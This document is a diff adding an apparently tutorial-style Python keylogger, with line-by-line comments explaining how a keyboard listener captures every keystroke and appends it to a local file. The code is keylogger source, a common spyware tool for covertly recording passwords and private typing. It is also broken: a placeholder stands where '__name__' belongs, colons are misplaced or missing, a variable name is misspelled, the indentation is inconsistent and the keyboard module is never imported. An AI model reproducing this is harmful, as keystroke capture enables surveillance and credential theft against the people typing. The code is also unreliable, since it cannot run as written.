@@ -1,0 +1,33 @@
+#This line syas if the mainn method(down below) would be ready to fire, what do we want to do?
+if ___== "__main__":
+ 
+
+#The on_press function automatically puts "key" into "keyPressed" 
+       def keyPressed(key):
+ 
+#Makes sure that the "key" above, is going to be converted to a string. 
+           print(str(key)):
+           
+           #"With open() is a way to files, create, and edit them 
+           #The line below is saying "We are going to open up this file. If there is no file like this, then we are going to create on."
+           with open("keyfile.txt", 'a') as logKey
+           
+                #"try" means that you are going to convert this key into a character to put into your file.
+                 try:
+                     char = key.char
+                     logKey.write(char)
+                 except:
+                     print("Error getting char")
+
+
+
+#Line 8 means a listener is going to be the obejct we are creating. 
+#The on_press means anytime the listener is turned on and you type a key on the keyboard, wherever the on_press is directed to, that is where the event will be sent to.
+#Evertime a key is pressed, it will send it to "keyPressed". 
+       listener = keyboard.Listener(on_press=keyPressed)
+
+#The line below starts the listener for the keybourd method, meaning it will start capturing the key strokes. 
+        listenr.start()
+
+#Input() means we are ready for stirngs to be input.
+       input()
